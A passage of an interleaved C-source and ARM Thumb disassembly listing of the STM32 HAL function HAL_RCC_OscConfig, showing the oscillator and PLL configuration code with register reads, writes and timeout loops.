 8003c08:	e008      	b.n	8003c1c <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003c0a:	f7fd facd 	bl	80011a8 <HAL_GetTick>
 8003c0e:	4602      	mov	r2, r0
 8003c10:	693b      	ldr	r3, [r7, #16]
 8003c12:	1ad3      	subs	r3, r2, r3
 8003c14:	2b02      	cmp	r3, #2
 8003c16:	d901      	bls.n	8003c1c <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003c18:	2303      	movs	r3, #3
 8003c1a:	e255      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003c1c:	4b65      	ldr	r3, [pc, #404]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003c1e:	681b      	ldr	r3, [r3, #0]
 8003c20:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c24:	2b00      	cmp	r3, #0
 8003c26:	d0f0      	beq.n	8003c0a <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003c28:	4b62      	ldr	r3, [pc, #392]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003c2a:	685b      	ldr	r3, [r3, #4]
 8003c2c:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003c30:	687b      	ldr	r3, [r7, #4]
 8003c32:	691b      	ldr	r3, [r3, #16]
 8003c34:	061b      	lsls	r3, r3, #24
 8003c36:	495f      	ldr	r1, [pc, #380]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003c38:	4313      	orrs	r3, r2
 8003c3a:	604b      	str	r3, [r1, #4]
 8003c3c:	e018      	b.n	8003c70 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003c3e:	4b5d      	ldr	r3, [pc, #372]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003c40:	681b      	ldr	r3, [r3, #0]
 8003c42:	4a5c      	ldr	r2, [pc, #368]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003c44:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003c48:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003c4a:	f7fd faad 	bl	80011a8 <HAL_GetTick>
 8003c4e:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003c50:	e008      	b.n	8003c64 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003c52:	f7fd faa9 	bl	80011a8 <HAL_GetTick>
 8003c56:	4602      	mov	r2, r0
 8003c58:	693b      	ldr	r3, [r7, #16]
 8003c5a:	1ad3      	subs	r3, r2, r3
 8003c5c:	2b02      	cmp	r3, #2
 8003c5e:	d901      	bls.n	8003c64 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003c60:	2303      	movs	r3, #3
 8003c62:	e231      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003c64:	4b53      	ldr	r3, [pc, #332]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003c66:	681b      	ldr	r3, [r3, #0]
 8003c68:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c6c:	2b00      	cmp	r3, #0
 8003c6e:	d1f0      	bne.n	8003c52 <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003c70:	687b      	ldr	r3, [r7, #4]
 8003c72:	681b      	ldr	r3, [r3, #0]
 8003c74:	f003 0308 	and.w	r3, r3, #8
 8003c78:	2b00      	cmp	r3, #0
 8003c7a:	d03c      	beq.n	8003cf6 <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003c7c:	687b      	ldr	r3, [r7, #4]
 8003c7e:	695b      	ldr	r3, [r3, #20]
 8003c80:	2b00      	cmp	r3, #0
 8003c82:	d01c      	beq.n	8003cbe <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003c84:	4b4b      	ldr	r3, [pc, #300]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003c86:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c8a:	4a4a      	ldr	r2, [pc, #296]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003c8c:	f043 0301 	orr.w	r3, r3, #1
 8003c90:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003c94:	f7fd fa88 	bl	80011a8 <HAL_GetTick>
 8003c98:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003c9a:	e008      	b.n	8003cae <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003c9c:	f7fd fa84 	bl	80011a8 <HAL_GetTick>
 8003ca0:	4602      	mov	r2, r0
 8003ca2:	693b      	ldr	r3, [r7, #16]
 8003ca4:	1ad3      	subs	r3, r2, r3
 8003ca6:	2b02      	cmp	r3, #2
 8003ca8:	d901      	bls.n	8003cae <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003caa:	2303      	movs	r3, #3
 8003cac:	e20c      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003cae:	4b41      	ldr	r3, [pc, #260]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003cb0:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cb4:	f003 0302 	and.w	r3, r3, #2
 8003cb8:	2b00      	cmp	r3, #0
 8003cba:	d0ef      	beq.n	8003c9c <HAL_RCC_OscConfig+0x3ec>
 8003cbc:	e01b      	b.n	8003cf6 <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003cbe:	4b3d      	ldr	r3, [pc, #244]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003cc0:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cc4:	4a3b      	ldr	r2, [pc, #236]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003cc6:	f023 0301 	bic.w	r3, r3, #1
 8003cca:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003cce:	f7fd fa6b 	bl	80011a8 <HAL_GetTick>
 8003cd2:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003cd4:	e008      	b.n	8003ce8 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003cd6:	f7fd fa67 	bl	80011a8 <HAL_GetTick>
 8003cda:	4602      	mov	r2, r0
 8003cdc:	693b      	ldr	r3, [r7, #16]
 8003cde:	1ad3      	subs	r3, r2, r3
 8003ce0:	2b02      	cmp	r3, #2
 8003ce2:	d901      	bls.n	8003ce8 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003ce4:	2303      	movs	r3, #3
 8003ce6:	e1ef      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003ce8:	4b32      	ldr	r3, [pc, #200]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003cea:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cee:	f003 0302 	and.w	r3, r3, #2
 8003cf2:	2b00      	cmp	r3, #0
 8003cf4:	d1ef      	bne.n	8003cd6 <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003cf6:	687b      	ldr	r3, [r7, #4]
 8003cf8:	681b      	ldr	r3, [r3, #0]
 8003cfa:	f003 0304 	and.w	r3, r3, #4
 8003cfe:	2b00      	cmp	r3, #0
 8003d00:	f000 80a6 	beq.w	8003e50 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003d04:	2300      	movs	r3, #0
 8003d06:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003d08:	4b2a      	ldr	r3, [pc, #168]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003d0a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d0c:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d10:	2b00      	cmp	r3, #0
 8003d12:	d10d      	bne.n	8003d30 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003d14:	4b27      	ldr	r3, [pc, #156]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003d16:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d18:	4a26      	ldr	r2, [pc, #152]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003d1a:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003d1e:	6593      	str	r3, [r2, #88]	; 0x58
 8003d20:	4b24      	ldr	r3, [pc, #144]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003d22:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d24:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d28:	60bb      	str	r3, [r7, #8]
 8003d2a:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003d2c:	2301      	movs	r3, #1
 8003d2e:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d30:	4b21      	ldr	r3, [pc, #132]	; (8003db8 <HAL_RCC_OscConfig+0x508>)
 8003d32:	681b      	ldr	r3, [r3, #0]
 8003d34:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d38:	2b00      	cmp	r3, #0
 8003d3a:	d118      	bne.n	8003d6e <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003d3c:	4b1e      	ldr	r3, [pc, #120]	; (8003db8 <HAL_RCC_OscConfig+0x508>)
 8003d3e:	681b      	ldr	r3, [r3, #0]
 8003d40:	4a1d      	ldr	r2, [pc, #116]	; (8003db8 <HAL_RCC_OscConfig+0x508>)
 8003d42:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003d46:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003d48:	f7fd fa2e 	bl	80011a8 <HAL_GetTick>
 8003d4c:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d4e:	e008      	b.n	8003d62 <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003d50:	f7fd fa2a 	bl	80011a8 <HAL_GetTick>
 8003d54:	4602      	mov	r2, r0
 8003d56:	693b      	ldr	r3, [r7, #16]
 8003d58:	1ad3      	subs	r3, r2, r3
 8003d5a:	2b02      	cmp	r3, #2
 8003d5c:	d901      	bls.n	8003d62 <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003d5e:	2303      	movs	r3, #3
 8003d60:	e1b2      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d62:	4b15      	ldr	r3, [pc, #84]	; (8003db8 <HAL_RCC_OscConfig+0x508>)
 8003d64:	681b      	ldr	r3, [r3, #0]
 8003d66:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d6a:	2b00      	cmp	r3, #0
 8003d6c:	d0f0      	beq.n	8003d50 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003d6e:	687b      	ldr	r3, [r7, #4]
 8003d70:	689b      	ldr	r3, [r3, #8]
 8003d72:	2b01      	cmp	r3, #1
 8003d74:	d108      	bne.n	8003d88 <HAL_RCC_OscConfig+0x4d8>
 8003d76:	4b0f      	ldr	r3, [pc, #60]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003d78:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d7c:	4a0d      	ldr	r2, [pc, #52]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003d7e:	f043 0301 	orr.w	r3, r3, #1
 8003d82:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d86:	e029      	b.n	8003ddc <HAL_RCC_OscConfig+0x52c>
 8003d88:	687b      	ldr	r3, [r7, #4]
 8003d8a:	689b      	ldr	r3, [r3, #8]
 8003d8c:	2b05      	cmp	r3, #5
 8003d8e:	d115      	bne.n	8003dbc <HAL_RCC_OscConfig+0x50c>
 8003d90:	4b08      	ldr	r3, [pc, #32]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003d92:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d96:	4a07      	ldr	r2, [pc, #28]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003d98:	f043 0304 	orr.w	r3, r3, #4
 8003d9c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003da0:	4b04      	ldr	r3, [pc, #16]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003da2:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003da6:	4a03      	ldr	r2, [pc, #12]	; (8003db4 <HAL_RCC_OscConfig+0x504>)
 8003da8:	f043 0301 	orr.w	r3, r3, #1
 8003dac:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003db0:	e014      	b.n	8003ddc <HAL_RCC_OscConfig+0x52c>
 8003db2:	bf00      	nop
 8003db4:	40021000 	.word	0x40021000
 8003db8:	40007000 	.word	0x40007000
 8003dbc:	4b9a      	ldr	r3, [pc, #616]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003dbe:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003dc2:	4a99      	ldr	r2, [pc, #612]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003dc4:	f023 0301 	bic.w	r3, r3, #1
 8003dc8:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003dcc:	4b96      	ldr	r3, [pc, #600]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003dce:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003dd2:	4a95      	ldr	r2, [pc, #596]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003dd4:	f023 0304 	bic.w	r3, r3, #4
 8003dd8:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003ddc:	687b      	ldr	r3, [r7, #4]
 8003dde:	689b      	ldr	r3, [r3, #8]
 8003de0:	2b00      	cmp	r3, #0
 8003de2:	d016      	beq.n	8003e12 <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003de4:	f7fd f9e0 	bl	80011a8 <HAL_GetTick>
 8003de8:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003dea:	e00a      	b.n	8003e02 <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003dec:	f7fd f9dc 	bl	80011a8 <HAL_GetTick>
 8003df0:	4602      	mov	r2, r0
 8003df2:	693b      	ldr	r3, [r7, #16]
 8003df4:	1ad3      	subs	r3, r2, r3
 8003df6:	f241 3288 	movw	r2, #5000	; 0x1388
 8003dfa:	4293      	cmp	r3, r2
 8003dfc:	d901      	bls.n	8003e02 <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003dfe:	2303      	movs	r3, #3
 8003e00:	e162      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003e02:	4b89      	ldr	r3, [pc, #548]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003e04:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e08:	f003 0302 	and.w	r3, r3, #2
 8003e0c:	2b00      	cmp	r3, #0
 8003e0e:	d0ed      	beq.n	8003dec <HAL_RCC_OscConfig+0x53c>
 8003e10:	e015      	b.n	8003e3e <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e12:	f7fd f9c9 	bl	80011a8 <HAL_GetTick>
 8003e16:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e18:	e00a      	b.n	8003e30 <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003e1a:	f7fd f9c5 	bl	80011a8 <HAL_GetTick>
 8003e1e:	4602      	mov	r2, r0
 8003e20:	693b      	ldr	r3, [r7, #16]
 8003e22:	1ad3      	subs	r3, r2, r3
 8003e24:	f241 3288 	movw	r2, #5000	; 0x1388
 8003e28:	4293      	cmp	r3, r2
 8003e2a:	d901      	bls.n	8003e30 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8003e2c:	2303      	movs	r3, #3
 8003e2e:	e14b      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e30:	4b7d      	ldr	r3, [pc, #500]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003e32:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e36:	f003 0302 	and.w	r3, r3, #2
 8003e3a:	2b00      	cmp	r3, #0
 8003e3c:	d1ed      	bne.n	8003e1a <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8003e3e:	7ffb      	ldrb	r3, [r7, #31]
 8003e40:	2b01      	cmp	r3, #1
 8003e42:	d105      	bne.n	8003e50 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8003e44:	4b78      	ldr	r3, [pc, #480]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003e46:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003e48:	4a77      	ldr	r2, [pc, #476]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003e4a:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8003e4e:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8003e50:	687b      	ldr	r3, [r7, #4]
 8003e52:	681b      	ldr	r3, [r3, #0]
 8003e54:	f003 0320 	and.w	r3, r3, #32
 8003e58:	2b00      	cmp	r3, #0
 8003e5a:	d03c      	beq.n	8003ed6 <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8003e5c:	687b      	ldr	r3, [r7, #4]
 8003e5e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003e60:	2b00      	cmp	r3, #0
 8003e62:	d01c      	beq.n	8003e9e <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 8003e64:	4b70      	ldr	r3, [pc, #448]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003e66:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e6a:	4a6f      	ldr	r2, [pc, #444]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003e6c:	f043 0301 	orr.w	r3, r3, #1
 8003e70:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e74:	f7fd f998 	bl	80011a8 <HAL_GetTick>
 8003e78:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003e7a:	e008      	b.n	8003e8e <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003e7c:	f7fd f994 	bl	80011a8 <HAL_GetTick>
 8003e80:	4602      	mov	r2, r0
 8003e82:	693b      	ldr	r3, [r7, #16]
 8003e84:	1ad3      	subs	r3, r2, r3
 8003e86:	2b02      	cmp	r3, #2
 8003e88:	d901      	bls.n	8003e8e <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 8003e8a:	2303      	movs	r3, #3
 8003e8c:	e11c      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003e8e:	4b66      	ldr	r3, [pc, #408]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003e90:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e94:	f003 0302 	and.w	r3, r3, #2
 8003e98:	2b00      	cmp	r3, #0
 8003e9a:	d0ef      	beq.n	8003e7c <HAL_RCC_OscConfig+0x5cc>
 8003e9c:	e01b      	b.n	8003ed6 <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8003e9e:	4b62      	ldr	r3, [pc, #392]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003ea0:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003ea4:	4a60      	ldr	r2, [pc, #384]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003ea6:	f023 0301 	bic.w	r3, r3, #1
 8003eaa:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003eae:	f7fd f97b 	bl	80011a8 <HAL_GetTick>
 8003eb2:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003eb4:	e008      	b.n	8003ec8 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003eb6:	f7fd f977 	bl	80011a8 <HAL_GetTick>
 8003eba:	4602      	mov	r2, r0
 8003ebc:	693b      	ldr	r3, [r7, #16]
 8003ebe:	1ad3      	subs	r3, r2, r3
 8003ec0:	2b02      	cmp	r3, #2
 8003ec2:	d901      	bls.n	8003ec8 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8003ec4:	2303      	movs	r3, #3
 8003ec6:	e0ff      	b.n	80040c8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003ec8:	4b57      	ldr	r3, [pc, #348]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003eca:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003ece:	f003 0302 	and.w	r3, r3, #2
 8003ed2:	2b00      	cmp	r3, #0
 8003ed4:	d1ef      	bne.n	8003eb6 <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 8003ed6:	687b      	ldr	r3, [r7, #4]
 8003ed8:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003eda:	2b00      	cmp	r3, #0
 8003edc:	f000 80f3 	beq.w	80040c6 <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8003ee0:	687b      	ldr	r3, [r7, #4]
 8003ee2:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003ee4:	2b02      	cmp	r3, #2
 8003ee6:	f040 80c9 	bne.w	800407c <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 8003eea:	4b4f      	ldr	r3, [pc, #316]	; (8004028 <HAL_RCC_OscConfig+0x778>)
 8003eec:	68db      	ldr	r3, [r3, #12]
 8003eee:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003ef0:	697b      	ldr	r3, [r7, #20]
 8003ef2:	f003 0203 	and.w	r2, r3, #3
 8003ef6:	687b      	ldr	r3, [r7, #4]
 8003ef8:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8003efa:	429a      	cmp	r2, r3
 8003efc:	d12c      	bne.n	8003f58 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003efe:	697b      	ldr	r3, [r7, #20]
 8003f00:	f003 0270 	and.w	r2, r3, #112	; 0x70
 8003f04:	687b      	ldr	r3, [r7, #4]
 8003f06:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003f08:	3b01      	subs	r3, #1
 8003f0a:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003f0c:	429a      	cmp	r2, r3
 8003f0e:	d123      	bne.n	8003f58 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f10:	697b      	ldr	r3, [r7, #20]
 8003f12:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 8003f16:	687b      	ldr	r3, [r7, #4]
 8003f18:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8003f1a:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003f1c:	429a      	cmp	r2, r3
 8003f1e:	d11b      	bne.n	8003f58 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f20:	697b      	ldr	r3, [r7, #20]
 8003f22:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 8003f26:	687b      	ldr	r3, [r7, #4]
